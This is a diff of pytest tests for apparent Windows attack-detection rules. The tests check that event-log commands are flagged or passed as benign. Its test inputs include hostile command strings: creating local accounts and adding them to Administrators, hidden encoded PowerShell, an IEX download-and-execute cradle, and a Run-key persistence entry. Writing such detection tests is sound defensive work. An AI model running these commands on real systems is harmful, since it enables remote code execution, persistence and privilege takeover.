@@ -52,3 +52,47 @@ def test_backdoor_and_powershell_cradle():
 
 def test_empty_input_is_unknown():
     assert run([])['label'] == 'UNKNOWN'
+
+import pytest
+from app.baseline_rules import account_command
+
+@pytest.mark.parametrize('command', [
+    'net user demo pw /add', 'net.exe user demo pw /add',
+    'NET1.EXE\tLOCALGROUP Administrators demo /ADD',
+    r'C:\Windows\System32\net.exe user demo pw /add',
+    r'"C:\Windows\System32\net1.exe" localgroup Administrators demo /add',
+    'cmd.exe /c "net.exe user demo pw /add"',
+    r'cmd.exe /d /c ""C:\Windows\System32\net.exe" user demo pw /add"',
+])
+def test_account_command_variants(command):
+    assert account_command(command)
+    assert run([event('p',4688,0,cmd=command)])['label']=='ALERT'
+
+@pytest.mark.parametrize('command', [
+    'internet.exe user demo pw /add', 'net.exe user demo /address',
+    'echo net.exe user demo pw /add', 'net.exe user demo',
+    'cmd.exe /c echo net.exe user demo pw /add', 'notnet user demo pw /add',
+])
+def test_account_command_boundaries(command):
+    assert not account_command(command)
+
+@pytest.mark.parametrize('cmd,script', [
+    ('powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA', None),
+    ('echo -EncodedCommand whatever', None),
+    (None, "Write-Output 'mimikatz'"),
+    (None, "(New-Object Net.WebClient).DownloadFile('https://example.org/report.csv','report.csv')"),
+    (None, "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"),
+    (r'reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Run', None),
+])
+def test_benign_keyword_and_read_only_controls(cmd,script):
+    from app.baseline_rules import event_stages
+    assert event_stages(event('x',4104 if script else 4688,0,cmd=cmd,script=script))==[]
+
+@pytest.mark.parametrize('cmd,script,stage', [
+    ('powershell.exe -NoP -WindowStyle Hidden -EncodedCommand ABC',None,'T1059.001 PowerShell'),
+    (None,"IEX (New-Object Net.WebClient).DownloadString('https://example.org/p.ps1')",'T1059.001 PowerShell'),
+    (r'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Demo /d demo.exe',None,'T1547.001 Registry Run Keys'),
+])
+def test_behavior_combinations_remain_alerts(cmd,script,stage):
+    from app.baseline_rules import event_stages
+    assert stage in event_stages(event('x',4104 if script else 4688,0,cmd=cmd,script=script))
